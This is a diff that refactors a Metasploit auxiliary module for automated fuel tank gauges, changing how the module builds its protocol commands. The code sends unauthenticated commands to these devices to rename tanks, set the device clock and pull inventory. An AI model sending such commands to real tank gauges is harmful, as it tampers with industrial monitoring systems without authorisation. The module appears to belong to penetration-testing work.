@@ -172,8 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def setup
     # ensure that the specified command is implemented for the desired version of the TLS protocol
-    proto_cmd = protocol + "_CMD"
-    fail "#{action.name} not defined for #{protocol}" unless action.opts.keys.include?(proto_cmd)
+    fail "#{action.name} not defined for #{protocol}" unless action.opts.keys.include?(protocol_opt_name)
 
     # ensure that the tank number is set for the commands that need it
     fail "TANK_NUMBER #{tank_number} is invalid" if action.name == 'SET_TANK_NAME' && (tank_number < 0 || tank_number > 99)
@@ -193,6 +192,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def protocol
     datastore['PROTOCOL']
+  end
+
+  def protocol_opt_name
+    protocol + '_CMD'
   end
 
   def tank_name
@@ -226,13 +229,13 @@ class Metasploit3 < Msf::Auxiliary
         else
           vprint_status("#{peer} -- setting tank ##{tank_number}'s name to #{tank_name}")
         end
-        request = "#{action.opts[protocol + '_CMD']}#{format('%02d', tank_number)}#{tank_name}\n"
+        request = "#{action.opts[protocol_opt_name]}#{format('%02d', tank_number)}#{tank_name}\n"
         sock.put(request)
         # reconnect
         disconnect
         connect
         # send an inventory probe to show that it succeeded
-        inventory_probe = "#{actions.find { |a| a.name == 'INVENTORY' }.opts[protocol + '_CMD']}\n"
+        inventory_probe = "#{actions.find { |a| a.name == 'INVENTORY' }.opts[protocol_opt_name]}\n"
         inventory_response = get_response(inventory_probe)
         message = "#{peer} #{protocol} #{action.opts['Description']}:\n#{inventory_response}"
         if inventory_response.include?(tank_name)
@@ -241,11 +244,9 @@ class Metasploit3 < Msf::Auxiliary
           print_warning message
         end
       when 'SET_TIME'
-        request = "#{action.opts[protocol + '_CMD']}#{Time.now.to_i}\n"
-        sock.put(request)
+        response = get_response("#{action.opts[protocol_opt_name]}#{Time.now.to_i}\n")
       else
-        request = "#{action.opts[protocol + '_CMD']}\n"
-        response = get_response(request)
+        response = get_response("#{action.opts[protocol_opt_name]}\n")
         print_good("#{peer} #{protocol} #{action.opts['Description']}:\n#{response}")
       end
     ensure
